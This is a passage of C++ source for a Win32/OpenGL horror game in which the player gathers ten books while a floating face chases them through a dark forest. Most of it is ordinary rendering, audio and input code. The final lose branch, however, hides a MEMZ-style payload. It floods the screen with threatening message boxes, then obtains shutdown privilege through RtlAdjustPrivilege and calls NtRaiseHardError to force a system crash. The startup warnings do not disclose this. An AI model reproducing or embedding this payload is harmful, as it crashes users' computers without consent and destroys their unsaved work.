    glTexCoord2f(1, 1); glVertex3f(x + rx * h + ux * h, y + ry * h + uy * h, z + rz * h + uz * h);
    glTexCoord2f(0, 1); glVertex3f(x - rx * h + ux * h, y - ry * h + uy * h, z - rz * h + uz * h);
    glEnd();
}

// Y-locked billboard with independent width/height (for squash & stretch)
void DrawBillboardYEx(float x, float y, float z, float w, float h, GLuint tex) {
    float mf[16];
    glGetFloatv(GL_MODELVIEW_MATRIX, mf);
    float rx = mf[0], ry = mf[4], rz = mf[8];   // camera right in world space
    (void)ry;
    float hw = w * 0.5f, hh = h * 0.5f;
    glBindTexture(GL_TEXTURE_2D, tex);
    glBegin(GL_QUADS);
    glTexCoord2f(0, 0); glVertex3f(x - rx * hw, y - hh, z - rz * hw);
    glTexCoord2f(1, 0); glVertex3f(x + rx * hw, y - hh, z + rz * hw);
    glTexCoord2f(1, 1); glVertex3f(x + rx * hw, y + hh, z + rz * hw);
    glTexCoord2f(0, 1); glVertex3f(x - rx * hw, y + hh, z - rz * hw);
    glEnd();
}

// Y-locked billboard (stands upright regardless of camera pitch)
void DrawBillboardY(float x, float y, float z, float size, GLuint tex) {
    DrawBillboardYEx(x, y, z, size, size, tex);
}

// ---------------- Render ----------------
void Render() {
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();

    float eyeY = TerrainH(g_posX, g_posZ) + EYE + g_posY;
    glRotatef(g_pitch * 57.2958f, 1, 0, 0);
    glRotatef(g_yaw * 57.2958f, 0, 1, 0);
    glTranslatef(-g_posX, -eyeY, -g_posZ);

    // sky dome (no fog, no depth write)
    glDepthMask(GL_FALSE);
    glPushMatrix();
    glTranslatef(g_posX, 0, g_posZ);
    glCallList(g_dlSky);
    glPopMatrix();

    // pale moon with a soft additive glow
    // NOTE: the sky display list leaves texturing in whatever state it used;
    // the exact state needed is re-set explicitly here.
    glEnable(GL_TEXTURE_2D);
    glDisable(GL_LIGHTING); glDisable(GL_FOG);
    glEnable(GL_BLEND);
    glBlendFunc(GL_SRC_ALPHA, GL_ONE);            // additive: moonlight bleed
    DrawBillboard(g_posX + 150.0f, 190.0f, g_posZ - 240.0f, 70.0f, g_texSun);
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
    // dark mist banks drifting under the moon
    for (int i = 0; i < 8; i++)
        DrawBillboard(g_clouds[i].x, g_clouds[i].y, g_clouds[i].z, g_clouds[i].s, g_texCloud);
    glDisable(GL_BLEND);
    glEnable(GL_FOG); glEnable(GL_LIGHTING);
    glDepthMask(GL_TRUE);

    // world
    glCallList(g_dlTerrain);
    glCallList(g_dlRuins);

    glBindTexture(GL_TEXTURE_2D, 0);
    for (int i = 0; i < 70; i++) {
        glPushMatrix();
        glTranslatef(g_trees[i].x, TerrainH(g_trees[i].x, g_trees[i].z) - 0.2f, g_trees[i].z);
        glRotatef(g_trees[i].rot * 57.2958f, 0, 1, 0);
        glScalef(g_trees[i].s, g_trees[i].s, g_trees[i].s);
        glCallList(g_dlTree);
        glPopMatrix();
    }
    glBindTexture(GL_TEXTURE_2D, g_texGrass);

    // collectible books: red leather cover + pale pages, bobbing and spinning.
    // drawn unlit so they read as faintly self-luminous in the dark forest
    glBindTexture(GL_TEXTURE_2D, g_texBark);
    glDisable(GL_LIGHTING);
    for (int i = 0; i < 10; i++) {
        if (g_books[i].taken) continue;
        glPushMatrix();
        float by = TerrainH(g_books[i].x, g_books[i].z)
                 + 0.35f + sinf(g_time * 2.0f + g_books[i].phase) * 0.12f;
        glTranslatef(g_books[i].x, by, g_books[i].z);
        glRotatef(g_time * 40.0f + g_books[i].phase * 57.3f, 0, 1, 0);
        glColor3f(0.95f, 0.28f, 0.24f);          // leather red, softly glowing
        DrawBox(0.55f, 0.16f, 0.75f);
        glColor3f(1.0f, 0.96f, 0.84f);           // pages
        glTranslatef(0.0f, 0.05f, 0.0f);
        DrawBox(0.44f, 0.10f, 0.62f);
        glColor3f(1, 1, 1);
        glPopMatrix();
    }
    glEnable(GL_LIGHTING);

    // the monster: a face floating upright, always facing you.
    // drawn unlit -- a fully lit face in a dark forest is the whole point
    if (g_monsterActive) {
        glEnable(GL_ALPHA_TEST);
        glAlphaFunc(GL_GREATER, 0.4f);
        glDisable(GL_LIGHTING);
        // rubbery squash & stretch while it walks, frozen when staring
        float sq = 0.0f;
        if (g_monFreeze <= 0.0f) {
            sq = sinf(g_time * 8.0f);            // -1..1
        }
        float w = 4.8f * (1.0f - 0.17f * sq);
        float hgt = 4.8f * (1.0f + 0.24f * sq);
        float my = TerrainH(g_monX, g_monZ) + hgt * 0.5f - 0.15f;
        DrawBillboardYEx(g_monX, my, g_monZ, w, hgt, g_texMonster);
        glEnable(GL_LIGHTING);
        glDisable(GL_ALPHA_TEST);
    }

    // red danger overlay, pulsing faster as the monster closes in
    if (g_intensity > 0.01f) {
        glDisable(GL_TEXTURE_2D); glDisable(GL_LIGHTING); glDisable(GL_FOG);
        glDisable(GL_DEPTH_TEST);
        glEnable(GL_BLEND);
        float pulse = 0.5f + 0.5f * sinf(g_time * (3.0f + g_intensity * 6.0f));
        float a = g_intensity * (0.25f + 0.25f * pulse);
        glMatrixMode(GL_PROJECTION); glPushMatrix(); glLoadIdentity();
        glOrtho(0, g_winW, g_winH, 0, -1, 1);
        glMatrixMode(GL_MODELVIEW); glPushMatrix(); glLoadIdentity();
        glColor4f(0.75f, 0.03f, 0.05f, a);
        glBegin(GL_QUADS);
        glVertex2f(0, 0); glVertex2f((float)g_winW, 0);
        glVertex2f((float)g_winW, (float)g_winH); glVertex2f(0, (float)g_winH);
        glEnd();
        glMatrixMode(GL_PROJECTION); glPopMatrix();
        glMatrixMode(GL_MODELVIEW); glPopMatrix();
        glDisable(GL_BLEND);
        glEnable(GL_DEPTH_TEST);
    }

    // HUD: game title centered on top, progress and hints on the left
    DrawStr((g_winW - 8 * 34.0f) * 0.5f, 44.0f, GAME_TITLE, false,
            0.62f, 0.60f, 0.68f);
    wchar_t hud[96];
    swprintf_s(hud, L"\u4E66\u672C: %d/10", g_booksGot);            // BOOKS: x/10
    DrawStr(28, 40, hud, false, 1.0f, 1.0f, 1.0f);
    DrawStr(28, 86, L"\u79FB\u52A8  \u9F20\u6807\u8F6C\u5411  \u7A7A\u683C\u8DF3\u8DC3  ESC \u9000\u51FA",
            false, 0.85f, 0.85f, 0.92f);                            // move / mouse / space / ESC quit

    if (!g_monsterActive && !g_endState) {
        int remain = 10 - (int)g_gameTime;
        if (remain < 0) remain = 0;
        wchar_t h2[96];
        swprintf_s(h2, L"\u6536\u96C6 10 \u672C\u4E66   \u5F02\u8C61\u5C06\u5728 %d \u79D2\u540E\u964D\u4E34", remain);
        DrawStr(28, 132, h2, false, 1.0f, 1.0f, 1.0f);
    } else if (!g_endState) {
        // big red warning, centered near the top
        const wchar_t* msg;
        int len;
        if (g_monFreeze > 0.0f) { msg = L"\u5B83\u6B63\u770B\u7740\u4F60"; len = 6; }  // IT IS WATCHING YOU
        else                    { msg = L"\u5FEB\u8DD1\uFF01";          len = 3; }  // RUN
        float w = len * 76.0f;
        DrawStr((g_winW - w) * 0.5f, 230.0f, msg, true, 1.0f, 0.08f, 0.06f);
    }
}
// ---------------- gameplay logic ----------------
void UpdateGame(float dt) {
    if (g_endState) return;
    g_gameTime += dt;

    // monster appears 10 s in, exactly 20 m straight ahead, then freezes for 5 s
    if (!g_monsterActive && g_gameTime > 10.0f) {
        float fwdX = sinf(g_yaw), fwdZ = -cosf(g_yaw);   // camera forward
        g_monX = g_posX + fwdX * 20.0f;
        g_monZ = g_posZ + fwdZ * 20.0f;
        if (g_monX >  190) g_monX =  190; if (g_monX < -190) g_monX = -190;
        if (g_monZ >  190) g_monZ =  190; if (g_monZ < -190) g_monZ = -190;
        g_monsterActive = true;
        g_monFreeze = 5.0f;                              // stand still, staring
    }

    // book pickup
    for (int i = 0; i < 10; i++) {
        if (g_books[i].taken) continue;
        float dx = g_books[i].x - g_posX, dz = g_books[i].z - g_posZ;
        if (dx * dx + dz * dz < 2.6f) {
            g_books[i].taken = true;
            g_booksGot++;
        }
    }

    // win: all 10 books
    if (g_booksGot >= 10) {
        g_endState = 1;
        g_hbTarget = 0.0f;                       // heartbeat fades out
        g_running = false;
        return;
    }

    // monster chases the player
    if (g_monsterActive) {
        float mdx = g_posX - g_monX, mdz = g_posZ - g_monZ;
        float mdist = sqrtf(mdx * mdx + mdz * mdz);
        if (g_monFreeze > 0.0f) {
            g_monFreeze -= dt;                 // frozen: no movement yet
        } else if (mdist > 0.01f) {
            float sp = 6.0f * dt;              // 20% slower than the player (7.5)
            g_monX += mdx / mdist * sp;
            g_monZ += mdz / mdist * sp;
        }
        // caught
        if (mdist < 2.0f) {
            g_endState = 2;
            g_hbTarget = 0.0f;                   // heartbeat fades out
            g_running = false;
            return;
        }
        // heartbeat loudness tracks distance -- the mixer reads g_hbTarget
        g_intensity = 1.0f - mdist / 50.0f;
        if (g_intensity < 0) g_intensity = 0;
        g_hbTarget = g_intensity * g_intensity;      // steeper as it closes in
    }
}

// ---------------- Update ----------------
void Update(float dt) {
    g_time += dt;                    // animation clock (books, squash, pulse)
    // camera-relative vectors (world forward = R_y(-yaw) applied to -Z)
    float fx = sinf(g_yaw),  fz = -cosf(g_yaw);
    float rx = cosf(g_yaw),  rz = sinf(g_yaw);
    float mx = 0, mz = 0;
    if (g_keys['W']) { mx += fx; mz += fz; }
    if (g_keys['S']) { mx -= fx; mz -= fz; }
    if (g_keys['D']) { mx += rx; mz += rz; }
    if (g_keys['A']) { mx -= rx; mz -= rz; }
    float len = sqrtf(mx * mx + mz * mz);
    if (len > 0) {
        float speed = 7.5f * dt;
        g_posX += mx / len * speed;
        g_posZ += mz / len * speed;
    }
    const float LIM = 195.0f;
    if (g_posX >  LIM) g_posX =  LIM;
    if (g_posX < -LIM) g_posX = -LIM;
    if (g_posZ >  LIM) g_posZ =  LIM;
    if (g_posZ < -LIM) g_posZ = -LIM;

    // jump
    if (g_keys[VK_SPACE] && g_onGround) { g_velY = 7.5f; g_onGround = false; }
    if (!g_onGround) {
        g_velY -= 22.0f * dt;
        g_posY += g_velY * dt;
    }
    if (g_posY <= 0) { g_posY = 0; g_velY = 0; g_onGround = true; }

    // drifting clouds
    for (int i = 0; i < 8; i++) {
        g_clouds[i].x += dt * 2.0f;
        if (g_clouds[i].x > 300) g_clouds[i].x = -300;
    }

    // heartbeat gain: smooth towards target, restart the thump on the up-swing
    float prevVol = g_hbVol;
    g_hbVol += (g_hbTarget - g_hbVol) * (dt * 5.0f > 1.0f ? 1.0f : dt * 5.0f);
    if (prevVol <= 0.002f && g_hbVol > 0.002f) g_hbPos = 0;

    UpdateGame(dt);
}

// ---------------- Mouse look ----------------
void MouseLook() {
    POINT c = { g_winW / 2, g_winH / 2 }, p;
    ClientToScreen(g_hWnd, &c);
    GetCursorPos(&p);
    int dx = p.x - c.x, dy = p.y - c.y;
    if (dx || dy) {
        g_yaw   += dx * SENS;
        // glRotatef transforms the WORLD, so positive pitch looks down --
        // mouse up (dy < 0) must INCREASE pitch... inverted was wrong, this
        // sign makes mouse-up look up.
        g_pitch += dy * SENS;
        if (g_pitch >  1.35f) g_pitch =  1.35f;
        if (g_pitch < -1.20f) g_pitch = -1.20f;
        SetCursorPos(c.x, c.y);
    }
}

// ---------------- Projection resize ----------------
void ResizeGL(int w, int h) {
    if (h == 0) h = 1;
    glViewport(0, 0, w, h);
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluPerspective(65.0, (double)w / h, 0.1, 900.0);
    glMatrixMode(GL_MODELVIEW);
}

// ---------------- audio: tiny waveOut mixer ----------------
// The background drone has to loop seamlessly while the heartbeat plays on
// top with a smoothly changing volume, so both are mixed by hand and fed to
// waveOut in a ring of prepared buffers.  (MCI's waveaudio driver rejects the
// "repeat" flag, and PlaySound can only play one sound at a time.)
#define AUDIO_SR     22050
#define AUDIO_NBUF   4
#define AUDIO_CHUNK  2048                     // samples per buffer (~93 ms)

struct SoundBuf { short* data; int n; };

SoundBuf g_bgm = { NULL, 0 };                 // drone loop
SoundBuf g_hb  = { NULL, 0 };                 // heartbeat thump loop (loudest take)
HWAVEOUT g_hwo = NULL;
WAVEHDR  g_ahdr[AUDIO_NBUF];
short    g_abuf[AUDIO_NBUF][AUDIO_CHUNK];
bool     g_audioOK = false;
int      g_bgmPos = 0;

// 16-bit PCM WAV loader (mono assumed -- all our files are mono)
SoundBuf LoadWavFile(const char* rel) {
    SoundBuf sb = { NULL, 0 };
    if (!rel) return sb;
    FILE* f = fopen(rel, "rb");
    if (!f) return sb;
    char id[4]; unsigned int sz = 0;
    if (fread(id, 1, 4, f) != 4 || memcmp(id, "RIFF", 4) != 0) { fclose(f); return sb; }
    fread(&sz, 4, 1, f);
    if (fread(id, 1, 4, f) != 4 || memcmp(id, "WAVE", 4) != 0) { fclose(f); return sb; }
    while (fread(id, 1, 4, f) == 4) {
        if (fread(&sz, 4, 1, f) != 1) break;
        if (memcmp(id, "fmt ", 4) == 0) {
            fseek(f, sz + (sz & 1), SEEK_CUR);
        } else if (memcmp(id, "data", 4) == 0) {
            int n = (int)(sz / 2);
            sb.data = new short[n];
            sb.n = (int)fread(sb.data, 2, n, f);
            break;
        } else {
            fseek(f, sz + (sz & 1), SEEK_CUR);
        }
    }
    fclose(f);
    return sb;
}

void FillAudioBuf(int i) {
    short* d = g_abuf[i];
    for (int k = 0; k < AUDIO_CHUNK; k++) {
        float v = 0.0f;
        if (g_bgm.data && g_bgm.n) {                 // seamless: wrap the index
            v += g_bgm.data[g_bgmPos] * (1.0f / 32768.0f);
            if (++g_bgmPos >= g_bgm.n) g_bgmPos = 0;
        }
        if (g_hb.data && g_hb.n && g_hbVol > 0.001f) {
            v += g_hb.data[g_hbPos] * (1.0f / 32768.0f) * g_hbVol;
            if (++g_hbPos >= g_hb.n) g_hbPos = 0;
        }
        if (v >  1.0f) v =  1.0f;
        if (v < -1.0f) v = -1.0f;
        d[k] = (short)(v * 32767.0f);
    }
}

void InitAudio() {
    g_bgm = LoadWavFile("audio/bgm.wav");
    g_hb  = LoadWavFile("audio/hb5.wav");         // loudest thump, scaled at mix time
    WAVEFORMATEX wf;
    memset(&wf, 0, sizeof(wf));
    wf.wFormatTag      = WAVE_FORMAT_PCM;
    wf.nChannels       = 1;
    wf.nSamplesPerSec  = AUDIO_SR;
    wf.wBitsPerSample  = 16;
    wf.nBlockAlign     = 2;
    wf.nAvgBytesPerSec = AUDIO_SR * 2;
    if (waveOutOpen(&g_hwo, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        return;
    for (int i = 0; i < AUDIO_NBUF; i++) {
        memset(&g_ahdr[i], 0, sizeof(WAVEHDR));
        g_ahdr[i].lpData          = (LPSTR)g_abuf[i];
        g_ahdr[i].dwBufferLength  = AUDIO_CHUNK * 2;
        waveOutPrepareHeader(g_hwo, &g_ahdr[i], sizeof(WAVEHDR));
        FillAudioBuf(i);
        waveOutWrite(g_hwo, &g_ahdr[i], sizeof(WAVEHDR));
    }
    g_audioOK = true;
}

void PumpAudio() {                                 // call once per frame
    if (!g_audioOK) return;
    for (int i = 0; i < AUDIO_NBUF; i++) {
        if (g_ahdr[i].dwFlags & WHDR_DONE) {
            FillAudioBuf(i);
            waveOutWrite(g_hwo, &g_ahdr[i], sizeof(WAVEHDR));
        }
    }
}

void ShutdownAudio() {
    if (!g_audioOK) return;
    waveOutReset(g_hwo);
    for (int i = 0; i < AUDIO_NBUF; i++)
        waveOutUnprepareHeader(g_hwo, &g_ahdr[i], sizeof(WAVEHDR));
    waveOutClose(g_hwo);
    g_audioOK = false;
}

// ---------------- Win32 window ----------------
LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CLOSE: g_running = false; return 0;
    case WM_SIZE:
        g_winW = LOWORD(l); g_winH = HIWORD(l);
        // Only safe after the GL context exists; WinMain calls ResizeGL
        // again right after wglMakeCurrent anyway.
        if (g_hRC) ResizeGL(g_winW, g_winH);
        return 0;
    case WM_KEYDOWN:
        g_keys[w & 255] = true;
        if ((w & 255) == VK_ESCAPE) g_running = false;
        return 0;
    case WM_KEYUP: g_keys[w & 255] = false; return 0;
    case WM_SYSCOMMAND:
        if ((w & 0xFFF0) == SC_SCREENSAVE || (w & 0xFFF0) == SC_MONITORPOWER) return 0;
        break;
    }
    return DefWindowProcA(h, m, w, l);
}
HCRYPTPROV prov;
int scrw, scrh;
int random() {
    if (prov == NULL)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);

    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            int x = random() % (scrw - pcs->cx);
            int y = random() % (scrh - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}
const char* msgs[] = { "你的电脑马上要被摧毁了！！","你被杨易京抓住了！！","杨易京将会结束掉你的电脑！！","你的电脑马上会死机哈哈哈！！" };
DWORD WINAPI ripMessageThread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxA(NULL, (LPCSTR)msgs[random() % 4], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    UnhookWindowsHookEx(hook);

    return 0;
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nCmdShow) {
    // Startup notices. Wide-character strings on purpose: they render
    // correctly no matter what "Character Set" the VS project is set to.
    scrw = GetSystemMetrics(SM_CXSCREEN);
    scrh = GetSystemMetrics(SM_CYSCREEN);
    if (MessageBoxW(NULL,
            L"欢迎来到小游戏“逃出杨易京的森林”\n"
            L"这个游戏旨在提供娱乐和挑战。\n"
            L"请确保在游玩之前已经保存你电脑上已经打开的文件。\n"
            L"点击“是”以开始游戏\n\n"
            L"你要开始游戏吗？",
            GAME_TITLE, MB_YESNO | MB_ICONWARNING) != IDYES ||
        MessageBoxW(NULL,
            L"游戏将会全屏！\n\n"
            L"你的任务就是收集10本书\n"
            L"同时确保不要被杨易京抓住！",
            GAME_TITLE, MB_YESNO | MB_ICONWARNING) != IDYES) {
        ExitProcess(0);
    }
    WNDCLASSA wc;
    memset(&wc, 0, sizeof(wc));
    wc.style = CS_OWNDC;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.lpszClassName = "DREAM3D";
    RegisterClassA(&wc);

    // fullscreen borderless window covering the whole desktop
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    g_winW = screenW;
    g_winH = screenH;

    g_hWnd = CreateWindowA("DREAM3D", "",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, hInst, NULL);
    SetWindowTextW(g_hWnd, GAME_TITLE);        // wide string: real Chinese title
    SetForegroundWindow(g_hWnd);
    SetFocus(g_hWnd);
    g_hDC = GetDC(g_hWnd);

    PIXELFORMATDESCRIPTOR pfd;
    memset(&pfd, 0, sizeof(pfd));
    pfd.nSize = sizeof(pfd);
    pfd.nVersion = 1;
    pfd.dwFlags = PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER;
    pfd.iPixelType = PFD_TYPE_RGBA;
    pfd.cColorBits = 32;
    pfd.cDepthBits = 24;
    int pf = ChoosePixelFormat(g_hDC, &pfd);
    SetPixelFormat(g_hDC, pf, &pfd);
    g_hRC = wglCreateContext(g_hDC);
    wglMakeCurrent(g_hDC, g_hRC);

    ResizeGL(g_winW, g_winH);   // must run AFTER context creation
    InitGL();
    InitFont();
    InitAudio();
    ShowCursor(FALSE);

    MSG msg;
    DWORD prev = GetTickCount();
    while (g_running) {
        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) g_running = false;
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        DWORD now = GetTickCount();
        float dt = (now - prev) / 1000.0f;
        if (dt > 0.1f) dt = 0.1f;
        prev = now;

        MouseLook();
        Update(dt);
        Render();
        SwapBuffers(g_hDC);
        PumpAudio();
        Sleep(1);
    }

    ShowCursor(TRUE);
    ShutdownAudio();
    wglMakeCurrent(NULL, NULL);
    wglDeleteContext(g_hRC);
    ReleaseDC(g_hWnd, g_hDC);

    // Get the fullscreen window out of the way BEFORE the dialog: a message box
    // owned by a WS_POPUP window that covers the whole desktop ends up hidden
    // behind it.  Hiding (rather than destroying) keeps the thread's message
    // queue clean -- DestroyWindow() posts WM_QUIT, which would make the modal
    // message box return instantly.
    ShowWindow(g_hWnd, SW_HIDE);

    if (g_endState == 1) {
        MessageBoxW(NULL,
            L"\u4F60\u6536\u96C6\u9F50\u4E86\u5341\u672C\u4E66\uFF0C\u9003\u79BB\u4E86\u8FD9\u7247\u68EE\u6797\u3002\n"
            L"\u90A3\u5F20\u8138\u6D88\u5931\u5728\u4E86\u96FE\u91CC\u2026\n\n",
            GAME_TITLE, MB_OK | MB_ICONINFORMATION);
    }
    else if (g_endState == 2) {
        MessageBoxW(NULL,
            L"\u4F60\u88AB\u6293\u4F4F\u4E86\u3002\n\n",
            GAME_TITLE, MB_OK | MB_ICONERROR);
        for (int i = 0; i < 30; i++) {
            CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
            Sleep(100);
        }
        HMODULE ntdll = LoadLibraryA("ntdll");
        FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
        FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

        if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
            BOOLEAN tmp1; DWORD tmp2;
            ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
            ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
        }
    }

    DestroyWindow(g_hWnd);
    g_hWnd = NULL;
    return 0;
}
